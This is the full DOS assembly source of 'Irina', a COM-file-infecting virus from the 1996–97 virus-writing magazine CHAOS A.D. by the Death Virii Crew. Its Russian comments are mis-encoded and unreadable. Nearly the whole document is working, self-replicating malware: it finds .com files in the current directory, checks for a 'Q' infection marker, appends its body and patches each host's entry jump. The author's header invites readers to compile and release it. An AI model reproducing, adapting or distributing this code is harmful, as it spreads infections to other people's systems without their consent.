   ; comment {
   ;
   ; [Death Virii Crew] Presents
   ; CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997
   ;
   ;
   ;                 Irina.
   ;
   ;
   ;  *à¥¤áâ ¢«ïî ¢á¥¬ ç¨â â¥«ï¬ CHAOS A.D. á¢®© ¯¥à¢ë© ¢¨àì. * §¢  ¢ ç¥áâì ¬®¥©
   ; «î¡¨¬®© ¤¥¢ãèª¨. Ž ¥ á®¤¥à¦¨â ¨ª ª¨å ¤¥áâàãªâ¨¢ëå äãªæ¨© ¨ § à ¦ ¥â ‘ŽŒ-
   ; ä ©«ë ¢ â¥ªãé¥¬ ª â «®£¥, ¤®¯¨áë¢ ¥â á¥¡ï ¢ ª®¥æ ä ©« . *®áª®«ìªã ï ç¥«®¢¥ª
   ; áªà®¬ë©, â® ª ª ¯à¨§ ª § à ¦¥¥®áâ¨ ¨á¯®«ì§®¢   ¯¥à¢ ï ¡ãª¢  ¬®¥© ª«¨çª¨
   ; Q. Ÿ áç¨â î çâ® ¢¨àì ¥ á«®¦ë© ¨ ¬®¦¥â ¡ëâì ¨á¯®«ì§®¢  ª ª ãç¥¡®¥ ¯®á®¡¨¥
   ; ¤«ï  ç¨ îé¨å. “ ª®£® ¢®§¨ªãâ ¢®¯à®áë ¨ ¯à¥¤«®¦¥¨ï ¯® ¤ ®¬ã ¨§¤¥«¨î ¬®¦¥â¥
   ; ¯¨á âì (ã¤ à¥¨¥   ¢â®à®© á«®£) ¯®  ¤à¥áã Death Virii Crew:263020,‹ãæª, /ï 11,
   ; Quiet (Irina). „«ï ª®¬¯¨«ïæ¨¨ ï ¨á¯®«ì§®¢ « TASM ver.3.2 ¨ ver.3.1. Žâª®¬¯¨«¨-
   ; àã©â¥, § ¯ãáâ¨â¥ ¨ à §à¥è¨â¥ íâ®¬ã ¡¥§®¡¨¤®¬ã ¤®¬ è¥¬ã ¦¨¢®â®¬ã ¯®¦¨âì ¢ ¢ -
   ; è¥¬ ¨ä®à¬ æ¨®®¬ ¯à®áâà áâ¢¥. Œ®¦¥â¥ ¬®¤¨ä¨æ¨à®¢ âì íâ®â ¢¨àì ª ª å®â¨â¥,
   ; ® ï ¥ ¥áã ¨ª ª®© ®â¢¥âáâ¢¥®áâ¨ §   ¥á¥ë© ãé¥à¡ ¯à¨ç¨¥ë© ª ª®©-
   ; ¨¡ã¤ì ¤¥áâàãªâ¨¢®© äãªæ¨¥© ¢áâ ¢«¥®© ¢ ¢¨àì.
   ;
   ;                           (C) By Quiet [DVC]
   ; {
   ;----------------------- à¥§ âì âãâ -------------------------------------------
   .model tiny
   .code
   org 100h
   start:

   db 0e9h                 ; Œ è¨ë© ª®¤ ª®¬ ¤ë JMP
   dw 0004h                ; *  4 ¡ ©â 
   bytes db 'DVCQ'         ; Š®£¤  íâ® ¢¨àì ¢ ç¨áâ®¬ ¢¨¤¥ §¤¥áì § ¯¨á    ¡à¥¢¨ âã-
                           ; à  Death Virii Crew (DVC) ¨ ¯à¨§ ª § à ¦¥®áâ¨ Q.
                           ; Š®£¤  íâ® § à ¦¥ ï ¯à®£  §¤¥áì § ¯¨á ® ®à¨£¨ «ìë¥
                           ; ¯¥à¢ë¥ âà¨ ¡ ©â  § à ¦¥®© ¯à®£¨ ¨ ¯à¨§ ª § à ¦¥-
                           ; ®áâ¨ Q.

   call _1                 ; *à¨ ª®¬ ¤¥ CALL ¯à®æ¥áá®à ¯®¬¥é ¥â  ¤à¥á ¢®§¢à â 
   _1:                     ; (á®¤¥à¦¨¬®¥ à¥£¨áâà  IP) ¢ áâ¥ª ¢ë¯®«ï¥¬®© ¯à®£¨
   pop bp                  ; ¢ë¨¬ ¥¬ ¨§ áâ¥ª  â® çâ® § á« «¨  CALL'®¬ ¢ ‚*
   sub bp,10ah             ; ‚*=‚*-PSP(100h)+0ah £¤¥ 0 h ¤«¨  ®â  ç «  ¢¨àï ¤®
                           ; ¤ ®© ª®¬ ¤ë ¨ ¯®«ãç ¥¬ ¤«¨ã § à ¦¥®© ¯à®£¨
   cld                     ; á¡à áë¢ ¥¬ ä« £  ¯à ¢«¥¨ï DF â¥¬ á ¬ë¬ ãáâ  ¢«¨¢ ï
                           ;  ¯à ¢«¥¨¥ ¢ë¯®«¥¨ï ®¯¥à æ¨© á® áâà®ª ¬¨ á«¥¢   
                           ;  ¯à ¢®

   ; ¢ íâ®© ®¯¥à æ¨¨ ¬ë áà ¢¨¢ ¬ ¯¥à¢ë¥ âà¨ ¡ ©â  ïç¥¥ª bytes ¨ dvc ¤«ï â®£® çâ®¡ë
   ; ®¯à¥¤¥«¨âì: íâ® ç¨áâë© ¢¨àì ¨«¨ § à ¦¥ ï ¯à®£  á ¢¨à¨¥¬

   mov si,offset bytes     ; ¢ SI á¬¥é¥¨¥ ïç¥©ª¨ bytes
   add si,bp               ; ¤®¤ ¥¬ ¤«¨ã § à ¦¥®© ¯à®£¨
   mov di,offset dvc       ; ¢ DI á¬¥é¥¨¥ ïç¥©ª¨ dvc
   add di,bp               ; ¤®¤ ¥¬ ¤«¨ã § à ¦¥®© ¯à®£¨
   mov cx,3        ; ¢ CX ª®«¨ç¥áâ¢® ¯à®¢¥àï¥¬ëå ¡ ©â
   rep cmpsb       ; ®¯¥à æ¨ï ¯à®¢¥àª¨
   je _2           ; ¥á«¨ ¡ ©âë á®¢¯ ¤ îâ, § ç¨â § ç¨â ç¨áâë© ¢¨àì ¯¥à¥-
               ; å®¤   _2, ¥á«¨ ¥ á®¢¯ ¤ îâ ¨¤¥¬ ¤ «ìè¥

   ; §¤¥áì ¬ë ¢®áâ  ¢«¨¢ ¥¬ ¯¥à¢ë¥ 3 ¡ ©â  § à ¦¥®© ¯à®£¨

   mov si,offset bytes     ; ¢ SI á¬¥é¥¨¥ ïç¥©ª¨ bytes
   add si,bp       ; ¤®¤ ¥¬ ¤«¨ã § à ¦¥®© ¯à®£¨
   mov di,100h     ; ¢ DI  ¤à¥á ªã¤  ¬ë ¡ã¤¥¬ ¢®áâ  ¢«¨¢ âì
   mov cx,3        ; ª®«¨ç¥áâ¢® ¢®áâ  ¢«¨¢ ¥¬ëå ¡ ©â®¢
   rep movsb       ; ®¯¥à æ¨ï ¯¥à¥áë«ª¨

   ; ¢ íâ®© ®¯¥à æ¨¨ ¬ë á®åà ï¥¬ DTA

   mov cx,100h     ; ª®«¨ç¥áâ¢® ¯¥à¥áë« ¥¬ëå ¡ ©â®¢
   push cx         ; íâã á®âî ¬ë ¢ áâíª, ¯®â®¬ ¬ë ¨á¯®«ì§ã¥¬ ¥¥ ¤«ï ¯¥à¥-
               ; ¤ ç¨ ã¯à ¢«¥¨ï § à ¦¥®© ¯à®£¨
   mov si,80h      ; ¢ SI  ¤à¥á á ª ª®£®  ç¨ ¥âáï DTA (¯® ã¬®«ç ¨î 80h)
   mov di,dta      ; ¢ DI  ¤à¥á ¡ãä¥à  ¢ ª®âàë© ¬ë á®åà ï¥¬ DTA
   rep movsb       ; ®¯¥à æ¨ï ¯¥à¥áë«ª¨

   _2:

   ; §¤¥áì ¬ë ãáâ  ¢«¨¢ ¥¬ ã¦ë©    ¤à¥á DTA. •®âï ¯® ã¬®«ç ¨î ® ¤®«¦¥ ¨ â ª
   ; ¡ëâì ãáâ ®¢«¥ ¯®  ¤à¥áã 80h, ® ã ¬¥ï á íâ¨¬ ¢®§¨ª«¨ ¯à®¡«¥¬¬ë ¨ ï à¥è¨«
   ; á ¬ ãª § âì á¨áâ¥¬¥ ªã¤  ®  ¤®«¦  ¢®§¢à é âì ¨¬ï ¯®âíæ¨ «ì®© ¦¥àâ¢ë.

   mov ah,1ah      ; ãáâ  ¢«¨¢ ¥¬ DTA
   mov dx,80h      ; ¯®  ¤à¥áã 80h
   int 21h

   mov ah,4eh      ; äãªæ¨ï ¯®¨áª  ¯¥à¢®© ¦¥àâ¢ë
   find:
   mov cx,20h      ; á  âà¨¡ãâ®¬ ARCHIVE
   mov dx,offset fname ; á¬¥é¥¨¥ ïç¥©ª¨ ¯ ¬ïâ¨ ¢ ª®âà®©  å ®¤¨âáï ¬ áª  ¯®
               ; ª®â®à®© ¬ë ¡ã¤¥¬ ¨áª âì ¦¥àâ¢ã
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã § à ¦¥®© ¯à®£¨
   int 21h
   jnc _3          ; ¥á«¨ ¥â ®è¨¡®ª â®   _3
   jmp quit        ; ®è¨¡ª¨?   ¢ëå®¤

   _3:
   cmp word ptr ds:[9ah],61000 ; ¯®â¥æ¨«ì ï ¦¥àâ¢  ¥ ¤®«¦  ¡ëâì ¡®«ìè¥ 61000
                   ; ¡ ©â®¢. „«¨  ¯®â¥æ¨ «ì®© ¦¥àâ¢ë ¢®§¢à ¦ ¥âáï
                   ; á¨áâ¥¬®© ¯® á¬¥é¥¨î 9 h
   ja next         ; ¥á«¨ ¤«¨  ¡®«ìè¥ 61000 â®   ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë

   mov ax,3d02h        ; ®âªàë¢ ¥¬ ¦¥àâ¢ã   çâ¥¨¥/§ ¯¨áì
   mov dx,9eh  ; ¢ DX  ¤à¥á ïç¥©ª¨ ¯ ¬ïâ¨ ¢ ª®â®à®©  å®¤¨âáï ¨¬ï ¦¥àâ¢ë (¯®
           ; ã¬®«ç ¨î ®®  å®¤¨âáï ¯®  ¤à¥áã 9eh)

   int 21h
   jc next         ; ®è¨¡ª¨?   ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë

   mov bx,ax       ; Ž¯¨á â¥«ì ä ©«  ¢ BX.*à¨ ®âªàëâ¨¨ ä ©«  á¨áâ¥¬   -
               ; § ç ¥â ¥¬ã ®¯à¥¤¥«¥ë© ®¯¨á â¥«ì ç¥à¥§ ª®â®àë© ® 
               ; ¡ã¤¥â à ¡®â âì á ä ©«®¬ ¢ ¤ «ì¥©è¥¬
   mov ah,3fh      ; äãªæ¨ï çâ¥ï ¨§ ä ©«  ¢ AH
   mov cx,3        ; ª®«¨ç¥áâ¢® áç¨âë¢ ¥¬ëå ¡ ©â®¢ ¢ CX
   mov dx,offset bytes ; á¬¥é¥¨¥ ïç¥©ª¨ ¯ ¬ïâ¨ ¢ ª®â®àãî ¡ã¤¥¬ áç¨âë¢ âì ¢ DX
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã § à ¦¥®© ¯à®£¨
   int 21h
   jc next         ; ®è¨¡ª¨?   ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë

   mov ax,4202h        ; ¢ AX äãªæ¨ï ¯¥à¥¬¥é¥¨ï pointer'a ¢ ª®¥æ ¦¥àâ¢ë
   mov cx,0        ; ¢ CX 0
   mov dx,0        ; ¢ DX 0
   int 21h
   jc next         ; ®è¨¡ª¨?   ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë

   ; ¯à¨ ¯¥à¥¬¥é¥¨¨ pointer'a ¢ ª®¥æ ä ©«  ¢ AX ¢®§¢à é ¥âáï ¤«¨  ä ©« 

   mov flen[bp],ax     ; á®¤¥à¦¨¬®¥ AX ¢ flen[bp]
   sub ax,3        ; ¢ëç¨â ¥¬ 3 ¡ ©â  (¤«¨  ª®¬ ¤ë JMP ª®â®à ï ¡ã¤¥â
               ; áâ®ïâì ¢  ç «¥). ‚ AX ¡ã¤¥â ¤«¨    ª®â®àãî ã¦®
               ; á®¢¥àè¨âì JMP ¯¥à¥å®¤
   mov jmpadr[bp],ax   ; á®¤¥à¦¨¬®¥ AX ¢ jmpadr[bp]

   mov dx,flen[bp]     ; ¤«¨ã ¦¥àâ¢ë ¢ DX
   mov cx,virlen       ; ¤«¨ã ¢¨àï ¢ CX
   sub dx,cx       ; ¢ëç¨â ¥¬ CX ¨§ DX
   js next         ; ¥á«¨ à¥§ã«ìâ â ®âà¨æ ¨¥«ìë© â® ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë
   add dx,6        ; ¯à¨¡ ¢¨¬ ª DX 6 ¡ ©â®¢

   mov ax,4200h        ; ¢ AX äãªæ¨ï ¯¥à¥¬¥é¥¨ï pointer'a ¢  ç «® ä ©« 
   mov cx,0        ; CX=0
   int 21h
   jc next         ; ®è¨¡ª¨?   next
   jmp _4          ; ¯¥à¥å®¤   _4

   next:           ; §¤¥áì ¬ë ¨é¥¬ á«¥¤ãîéãî ¦¥àâ¢ã
   mov ah,3eh      ; § ªàë¢ ¥¬ ä ©«
   int 21h
   mov ah,4fh      ; ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë
   jmp find

   _4:
   mov ah,3fh      ; ç¨â ¥¬ ¨§ ä ©« 
   mov cx,1        ; 1 ¡ ©â
   mov dx,offset bytes+3   ; ¢ ïç¥©ªã bytes   ¬¥áâ® ¯®á«¥¤¥£® á¨¬¢®« 
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã ¯à®£¨
   int 21h
   jc next         ; ®è¨¡ª¨?   next

   ; §¤¥áì ¬ë ¯à®¢¥àï¬ ä ©«   § à ¦¥®áâì

   cmp byte ptr bytes+3+bp,'Q' ; áà ¢¨¢ ¥¬ â® çâ® ¯à®ç¨â «¨ á ¡ãª¢®© Q
   je next         ; íâã ¦¥àâ¢ã ¬ë ã¦¥ ¨¬¥«¨?   ¯®¨áª á«¥¤ãîé¥© ¦¥àâ¢ë

   mov ax,4202h        ; ¢ AX äãªæ¨ï ¯à¥¬¥é¥¨ï pointer'a ¢ ª®¥æ ä ©« 
   mov dx,0        ; ¢ DX 0
   mov cx,0        ; ¢ CX 0
   int 21h
   jc next         ; ®è¨¡ª¨?   next

   ; §¤¥áï ¬ë ¨¬¥¥¬ ¦¥àâ¢ã

   mov ah,40h      ; ¢ AH äãªæ¨ï § ¯¨á¨ ¢ ä ©«
   mov cx,virlen       ; ¢ CX ª®«¨ç¥áâ¢® § ¯¨áë¢ ¥¬ëå ¡ ©â®¢
   mov dx,100h     ; ¢ DX ®âªã¤  ¡ã¤¥¬ § ¯¨áë¢ âì
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã ¯à®£¨
   int 21h
   jc next         ; ®è¨¡ª¨?   n¥xt

   mov ax,4200h        ; ¢ AX äãªæ¨ï ¯¥à¥¬¥é¥¨ï pointer'a ¢  ç «® ä ©« 
   mov cx,0        ; ¢ CX 0
   mov dx,0        ; ¢ DX 0
   int 21h
   jc next         ; ®è¨¡ª¨?   next

   mov ah,40h      ; § ¯¨áë¢ ¥¬ ¢ ¦¥àâ¢ã
   mov cx,1        ; ®¤¨ ¡ ©â
   mov dx,offset jump  ; á ïç¥©ª¨ ¯ ¬ïâ¨ JUMP
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã ¯à®£¨
   int 21h
   jc next         ; ®è¨¡ª¨?   next

   mov ah,40h      ; § ¯¨áë¢ ¥¬ ¢ ¦¥àâ¢ã
   mov cx,2        ; ¤¢  ¡ ©â 
   mov dx,offset jmpadr    ; á ïç¥©ª¨ ¯ ¬ïâ¨ JMPADR
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã ¯à®£¨
   int 21h
   jc next         ; ®è¨¡ª¨?   next

   mov ax,flen[bp]     ; ¢ AX ¨§ FLEN[BP]
   add ax,6        ; ¯à¨¡ ¢«ï¥¬ 6
   mov flen[bp],ax     ; ¨ § áë« ¥¬ ¢á¥ íâ® ¢ AX

   mov ax,4200h        ; pointer ¢  ç «®
   mov cx,0        ; ¢ CX 0
   mov dx,flen[bp]     ; ¢ DX ¨§ FLEN[BP]
   int 21h
   jc next         ; ®è¨¡ª¨?   next

   mov ah,40h      ; § ¯¨áë¢ ¥¬ ¢ ¦¥àâ¢ã
   mov cx,1        ; 1 ¡ ©â
   mov dx,offset q     ; ¨ ïç¥©ª¨ ¯ ¬ïâ¨ Q
   add dx,bp       ; ¯à¨¡ ¢«ï¥¬ ¤«¨ã ¯à®£¨
   int 21h
   jnc quit        ; ¥á«¨ ¥â ®è¨¡®ª â®   ¢ëå®¤
   jmp next        ; ®è¨¡ª¨?   next

   quit:           ; ¢ëå®¤
   mov ah,3eh      ; § ªàë¢ ¥¬ ¦¥àâ¢ã
   int 21h

   mov si,dta      ; ¢ SI  ¤à¥á £¤¥  å®¤¨âáï áâ à ï DTA
   mov di,80h      ; ¢ DI  ¤à¥á ªã¤  ¬ë ¥¥ ¯¥à¥è«¥¬
   mov cx,100h     ; ¢ CX áª®«ìª® ¬ë ¥¥ ¯¥à¥è«¥¬
   rep movsb       ; ¯à¥áë« ¥¬
   ret         ; GAME OVER

   jump db 0e9h        ; JMP ¢ ¬ è¨®¬ ª®¤¥
   jmpadr dw ?     ; áî¤  § ®á¨âáï   áª®«ìª® ¡ ©â®¢ ¤¥« âì JMP
   q db 'Q'        ; ¤«ï áà ¢¥¨ï   § à ¦¥®áâì
   dta equ 0f000h      ;  ¤à¥á ¡ãä¥à  ¤«ï á®åà ¥¨ï DTA
   flen dw ?       ; áî¤  § ®á¨âáï ¤«¨  ¦¥àâ¢ë
   dvc db 'DVC'        ; ¤«ï ¯à®¢¥àª¨   ç¨áâë© ¢¨àì
   fname db '*.com',0  ; ¬ áª  ¯® ª®â®à®© ¨é¥¬ ¦¥àâ¢ã
   virlen equ $-start  ; ¤«¨  ¢¨àï
   end start
   ; ----------------------- à¥§ âì âãâ -------------------------------------------
